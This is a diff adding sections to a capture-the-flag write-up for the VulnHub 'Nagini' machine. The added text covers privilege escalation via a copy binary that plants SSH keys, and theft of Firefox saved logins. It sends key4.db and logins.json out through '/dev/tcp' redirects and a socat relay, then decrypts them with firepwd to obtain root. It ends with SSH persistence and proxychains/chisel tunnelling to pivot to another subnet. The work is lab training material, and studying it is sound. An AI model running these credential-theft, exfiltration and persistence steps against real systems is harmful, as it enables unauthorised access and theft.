@@ -644,7 +644,7 @@ bash-5.0#
 
 
 
-## Enumeration | Pivoting 10.10.0.137
+## Enumeration | Pivoting 10.10.0.?
 
 -using my tool [HostDiscovery](https://zeekk3n.github.io/andrey.github.io/project-host-discovery/#) we will search for more IP/interfaces
 
@@ -1615,12 +1615,13 @@ www-data
 
 # Privilage Escalation | 10.10.0.137
 
+First of all we need to find ways of escalate to root 
 
 ```bash
 www-data@Nagini:/var/www/html/joomla$ whoami
 www-data
 ```
-asd
+here we found an users named hermoine, snape and a archive called .creds.txt
 ```bash
 www-data@Nagini:/$ cd /home/
 www-data@Nagini:/home$ ls
@@ -1666,7 +1667,10 @@ snape@Nagini:~$ whoami
 snape
 snape@Nagini:~$ 
 ```
-user pivoting 
+that was an easy way to get the credentials for snape let's find a way to be root
+
+we can try a technique called user pivoting which is basically to get access to another user into the same environment 
+
 
 ```bash
 snape@Nagini:/var/www/html/joomla$ cd /home/hermoine/
@@ -1676,8 +1680,8 @@ snape@Nagini:/home/hermoine$ cd bin/
 snape@Nagini:/home/hermoine/bin$ ls
 su_cp
 ```
+we found a binarie called su_cp am able to use cp with  hermoine user so let's upload the id_rsa_pub in .ssh file of hermione to get access without password
 
-a
 ```bash
 snape@Nagini:/home/hermoine/bin$ nano /tmp/authorized_keys
 snape@Nagini:/home/hermoine/bin$ ./su_cp /tmp/authorized_keys /home/hermoine/.ssh/authorized_keys 
@@ -1688,6 +1692,373 @@ snape@Nagini:/home/hermoine/bin$ ./su_cp /tmp/authorized_keys /home/hermoine/.ss
 hermione@Nagini:~$ whoami
 hermione
 ```
+
+in hermoine desktop we found a critical directory called mozilla 
+
+```bash
+hermoine@Nagini:~$ ls -la
+total 28
+drwxr-xr-x 6 hermoine hermoine 4096 Apr  4  2021 .
+drwxr-xr-x 4 root     root     4096 Apr  4  2021 ..
+drwx------ 3 hermoine hermoine 4096 Apr  4  2021 .gnupg
+drwx------ 5 hermoine hermoine 4096 Jun  1  2019 .mozilla
+drwxr-xr-x 2 hermoine hermoine 4096 May  1 21:35 .ssh
+drwxr-xr-x 2 hermoine hermoine 4096 Apr  4  2021 bin
+-r--r----- 1 hermoine hermoine   75 Apr  4  2021 horcrux2.txt
+```
+let's try to get the passwords of .mozilla because sometimes users save their passwords in that directory 
+```bash
+hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ ls
+AlternateServices.txt	     blocklist.xml		containers.json        extension-preferences.json  gmp		      logins.json	  prefs.js		 sessionCheckpoints.json	     times.json
+ClientAuthRememberList.txt    bookmarkbackups		content-prefs.sqlite   extensions		  gmp-gmpopenh264     minidumps	  protections.sqlite	 sessionstore.jsonlz4		     weave
+SecurityPreloadState.txt      broadcast-listeners.json	cookies.sqlite	      extensions.json		  handlers.json       permissions.sqlite  saved-telemetry-pings  shield-preference-experiments.json  webappsstore.sqlite
+SiteSecurityServiceState.txt  cert9.db			crashes		      favicons.sqlite		  key4.db	      pkcs11.txt	  search.json.mozlz4	 shield-recipe-client.json	     xulstore.json
+addonStartup.json.lz4	     cert_override.txt		datareporting	      features			  lock		      places.sqlite	  security_state	 storage
+addons.json		     compatibility.ini		enumerate_devices.txt  formhistory.sqlite	  logins-backup.json  pluginreg.dat	  serviceworker.txt	 storage.sqlite
+hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ cat logins.json 
+{"nextId":5,"logins":[{"id":4,"hostname":"http://nagini.hogwarts","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNjdCM6xwGZvBAia4NxciV72TQ==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECAGAbZHd/uQkBBD9Ftg4gxw85Lco5YQ8g1wt","guid":"{b89776a4-7e8f-472d-9bcf-b06ec071912f}","encType":1,"timeCreated":1617516357729,"timeLastUsed":1617516357729,"timePasswordChanged":1617516357729,"timesUsed":1}],"version":3,"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{}}hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ 
+```
+and seems to be encrypted so one tool that we can use to decrypt them is called de firepwd or firefoxdecript 
+
+to visualize them we have to bring it to our personal desktop using socat + python3 because from my personal desktop we can not reach 10.10.0.137 we are reaching because of the proxychains + chisel so 
+
+first of all let's install firepwd to decrypt that password
+
+```bash
+❯ git clone https://github.com/lclevy/firepwd
+Clonando en 'firepwd'...
+remote: Enumerating objects: 88, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 88 (delta 2), reused 3 (delta 0), pack-reused 80
+Recibiendo objetos: 100% (88/88), 239.08 KiB | 724.00 KiB/s, listo.
+Resolviendo deltas: 100% (41/41), listo.
+```
+if you have this problem 
+
+```
+❯ ls
+ mozilla_db   firepwd.py   LICENSE   mozilla_pbe.pdf   mozilla_pbe.svg   readme.md   requirements.txt
+❯ python3 firepwd.py
+Traceback (most recent call last):
+  File "/home/z3kk3n/Desktop/vulnHUB/targetMachine/content/firepwd/firepwd.py", line 28, in <module>
+    from Crypto.Cipher import DES3, AES
+ModuleNotFoundError: No module named 'Crypto'
+```
+this is a way to fix it 
+```
+with this command you  create a virtual environment  
+❯ python3 -m venv venv
+here's a way of activate
+❯ source venv/bin/activate
+now the installation 
+
+❯ pip3 install -r requirements.txt
+Collecting PyCryptodome>=3.9.0
+  Downloading pycryptodome-3.17-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
+     |████████████████████████████████| 2.1 MB 1.3 MB/s 
+Collecting pyasn1>=0.4.8
+  Downloading pyasn1-0.5.0-py2.py3-none-any.whl (83 kB)
+     |████████████████████████████████| 83 kB 2.3 MB/s 
+Installing collected packages: PyCryptodome, pyasn1
+Successfully installed PyCryptodome-3.17 pyasn1-0.5.0
+```
+usage 
+if we try to execute it 
+
+```bash 
+❯ python3 firepwd.py
+cannot find key4.db or key3.db
+```
+they ask us for a key4.db or key3.db to 
+
+and actually we have them let's bring it 
+
+
+how we can not reach our ip we have to work using socat from the intermediary node so from 10.10.0.136 in our case 
+
+```bash
+./socat TCP-LISTEN:4848,fork TCP:192.168.100.53:692 
+```
+where ```TCP-LISTEN``` stay listening all the traffic coming from 4848```,fork``` and fork it ```TCP:192.168.100.53:692``` now send them to 192.168.100.53:692
+
+now how we don't have python or nc we have to use cat to tranfer data
+
+```bash
+hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ cat < key4.db > /dev/tcp/10.10.0.136/692
+```
+where ```cat``` visulize the output ```< key4.db > ``` from key.db and send to ``` /dev/tcp/10.10.0.692``` the node 10.10.0.136 on port 692
+we have to do the same thing with the another archive 
+
+ ``` cat < logins.json  > /dev/tcp/10.10.0.136/4848```
+ 
+
+let's crack them using the tool that we fixed and installed 
+
+```bash
+ython3 firepwd.py key4.db logins.json
+globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
+     SEQUENCE {
+       OCTETSTRING b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
+       INTEGER b'01'
+     }
+   }
+   OCTETSTRING b'2065c62fe9dc4d8352677299cc0f2cb8'
+ }
+entrySalt: b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
+b'70617373776f72642d636865636b0202'
+password check? True
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
+     SEQUENCE {
+       OCTETSTRING b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
+       INTEGER b'01'
+     }
+   }
+   OCTETSTRING b'ceedd70a1cfd8295250bcfed5ff49b6c878276b968230619a2c6c51aa4ea5c8e'
+ }
+entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
+b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
+decrypting login/password pairs
+http://nagini.hogwarts:b'root',b'@Alohomora#123'
+```
+seems that we have potentials credentias let's try them for root 
+```bash
+hermoine@Nagini:~/.mozilla/firefox/g2mhbq0o.default$ su root
+Password: 
+root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# whoami
+root
+root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# 
+```
+
+flag 
+```php
+root@Nagini:/home/hermoine/.mozilla/firefox/g2mhbq0o.default# cd /root/
+root@Nagini:~# ls
+horcrux3.txt
+root@Nagini:~# cat horcrux3.txt 
+  ____                            _         _       _   _                 
+ / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
+| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+ \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+                  |___/                                                   
+
+
+Machine Author: Mansoor R (@time4ster)
+Machine Difficulty: Medium
+Machine Name: Nagini
+Horcruxes Hidden in this VM: 3 horcruxes
+
+You have successfully pwned Nagini machine.
+Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}
+
+
+
+
+# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
+
+root@Nagini:~# 
+```
+# Reconnaissance 192.168.100.?
+
+now let's find another machines because if we are able to watch another interface it's because theres other machines in to this environment.
+
+```bash
+root@Nagini:~# hostname -I
+192.168.100.129 10.10.0.137 
+```
+
+
+## Enumeration | Pivoting 192.168.100.?
+
+-using my tool [HostDiscovery](https://zeekk3n.github.io/andrey.github.io/project-host-discovery/#) we will search for more IP/interfaces
+
+first of all we need to verify which interfaces we are able to enumerate.
+
+```bash
+root@Nagini:/dev/shm# nano host.sh 
+root@Nagini:/dev/shm# ./host.sh 
+[+] host 192.168.100.1 - is ACTIVE
+[+] host 192.168.100.130 - is ACTIVE
+[+] host 192.168.100.129 - is ACTIVE
+root@Nagini:/dev/shm# 
+```
+it looks like we can enumerate host 192.168.100.130, let's use my tool in order to find open ports  [PortScanner](https://zeekk3n.github.io/andrey.github.io/project-portscanner/#)
+
+
+```bash
+root@Nagini:/dev/shm# ./Portscanner.sh 
+[+] Port 21 - is OPEN
+[+] Port 22 - is OPEN
+[+] Port 80 - is OPEN
+[+] Port 2222 - is OPEN
+[+] Port 9898 - is OPEN
+^C
+
+[!] getting out that here...
+
+root@Nagini:/dev/shm# 
+```
+h
+
+
+
+how we know the ip for the machine that we can reach, now we have to enumerate to figure out what kind of machine is based on the TTL which is time to life.
+```bash
+root@Nagini:/dev/shm# ping -c3 192.168.100.30
+
+output:
+```php
+PING 192.168.100.30 (192.168.100.30) 56(84) bytes of data.
+^C
+--- 192.168.100.30 ping statistics ---
+3 packets transmitted, 0 received, 100% packet loss, time 56ms
+
+root@Nagini:/dev/shm# ping -c 3 192.168.100.130
+PING 192.168.100.130 (192.168.100.130) 56(84) bytes of data.
+64 bytes from 192.168.100.130: icmp_seq=1 ttl=64 time=0.471 ms
+64 bytes from 192.168.100.130: icmp_seq=2 ttl=64 time=0.346 ms
+64 bytes from 192.168.100.130: icmp_seq=3 ttl=64 time=0.474 ms
+
+--- 192.168.100.130 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 57ms
+rtt min/avg/max/mdev = 0.346/0.430/0.474/0.062 ms
+```
+
+
+- ```-TTL-``` : means the time to life of the machine, if it's 64 the machine is Linux, or if it's 124 the machine will be windows.
+- ```--3 packets transmitted, 3 received``` : with this output means that the machine is active.
+
+SSH keys
+how we found another machine that we are able to do pivoting let's make persistance with ssh keys in case if we need to bring back again to hagridMachine
+
+
+we have to check the id rsa pub 
+```bash
+cat ~/.ssh/id_rsa.pub
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: /root/.ssh/id_rsa.pub
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx3N+ZKQLTQIgqGkcpWZcxbt6j4/qTj4dmyyDtu6w7zyMVKsAFqJj6EGEqWYd8tysgM3O7ds7EAnRAwey1w6oEpQ0YmzVvWE1Ose/FuxSu8UVTZ8Kq/dwzIuANcrNYpS6TAvx0VsCnsdNUNLqhcCXWu3cX/7ocUUczHaO/z/Q2Nql4AUL1isOg/4Y/NpVaQG26y4tmB55
+       │ COIVXBnikNltrxTeym2/9WtHhB2ev0UuJZstU7eFXwqfD15SBv31IezQGY6MaXUSdEjORWVb6vDZLcstK22IqrLGCuyn0GquKCdg8JWx8mxQYGrxz9jF2RGm/tsiVi+9rXaFDVQhx2hhRK000OWhD8YtbEGXTi5jYJgzSXSjMuz4u62bk+lVgXS1S2Fnauz4f1vGFJHacxUPQY9q0Yswe4n6t0soNDB3Dm6SDebRDXLF6x0
+       │ I50SzsBWDdmcbEM1wHZ0xOfDO2L/M2ILOCnWqg0WNkS5nQ5IDeXqoFqcZVFsP+RmNht3uAjgU= root@parrot
+```
+
+in order to copy + paste and remove the spaces between each line
+
+```bash
+❯ cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
+```
+now we have to paste it in /root/.ssh on (hagrid98) machine 
+
+```bash
+root@Nagini cd /root/.ssh/
+root@Nagini ls
+root@Nagini nano authorized_keys
+```
+paste it 
+and let's verify if it works
+from our machine let's use ssh
+```bash
+❯ ssh root@10.10.0.137
+Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@Nagini:
+```
+# Prework of PIVOTING 192.168.100.130
+how we figure out a new interface with a new ip with open ports we will try to enumerate them 
+
+first of all is not anymore a strick chain from the proxyconfig so we have to edit it 
+
+we have to change it to Dynamic chain 
+
+go to vim 
+
+```bash 
+/etc/proxychains.conf 
+````
+now have to set 
+the new connection the way that we set them,It's like stacking books one on top of the other, the new would ride on top of the old.
+```
+  66   │ socks5 127.0.0.1 8888 
+  67   │ socks5 127.0.0.1 1080
+```
+and comment # the strick chain and descomment the Dynamic chain 
+```
+  10   │ dynamic_chain
+  11   │ #
+  12   │ # Dynamic - Each connection will be done via chained proxies
+  13   │ # all proxies chained in the order as they appear in the list
+  14   │ # at least one proxy must be online to play in chain
+  15   │ # (dead proxies are skipped)
+  16   │ # otherwise EINTR is returned to the app
+  17   │ #
+  18   │ #strict_chain
+  19   │ #
+```
+
+now you have to play with tunnels in order to set the conection successfully 
+for that you need to 
+transfer chisel to nagini machine because it will work as intermediary
+
+```bash
+❯ proxychains scp  chisel_1.8.1_linux_amd64 root@10.10.0.137:/dev/shm/chisel
+ProxyChains-3.1 (http://proxychains.sf.net)
+|D-chain|-<>-127.0.0.1:8888-<--timeout
+|D-chain|-<>-127.0.0.1:1080-<><>-10.10.0.137:22-<><>-OK
+chisel_1.8.1_linux_amd64                                                                                                                                                                                              100% 8188KB  18.8MB/s   00:00    
+```
+
+no we have to execute chisel in aragog machine in order to stay listening to the output of 10.10.137 (nagini) and send it to our personal desktop this way works with input and output
+
+```bash
+root@Aragog:/dev/shm# ./socat TCP-LISTEN:6666,fork TCP:192.168.100.53:1234 
+```
+
+
+and now from nagini all the output that comes from 192.168.100.130 we have to redirect to the tunnel that we made 
+
+```bash 
+^Croot@Nagini:/dev/shm# ./chisel client 10.10.0.136:6666 R:8888:socks
+```
+let's enumerate 192.168.100.130 from pur personal destop in order to verify if all these works 
+```bash
+❯ proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 192.168.100.130 2>/dev/null | grep  -vE "timeout"
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 00:59 CST
+Initiating Connect Scan at 00:59
+Scanning 192.168.100.130 [500 ports]
+Discovered open port 21/tcp on 192.168.100.130
+Discovered open port 22/tcp on 192.168.100.130
+Discovered open port 80/tcp on 192.168.100.130
+Connect Scan Timing: About 45.60% done; ETC: 01:00 (0:00:37 remaining)
+Discovered open port 2222/tcp on 192.168.100.130
+Completed Connect Scan at 01:00, 66.03s elapsed (500 total ports)
+Nmap scan report for 192.168.100.130
+Host is up (0.13s latency).
+Not shown: 496 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 66.07 seconds
+```
+it  works xD agradecido con el de arriba
+
 
 
 Happy hacking !
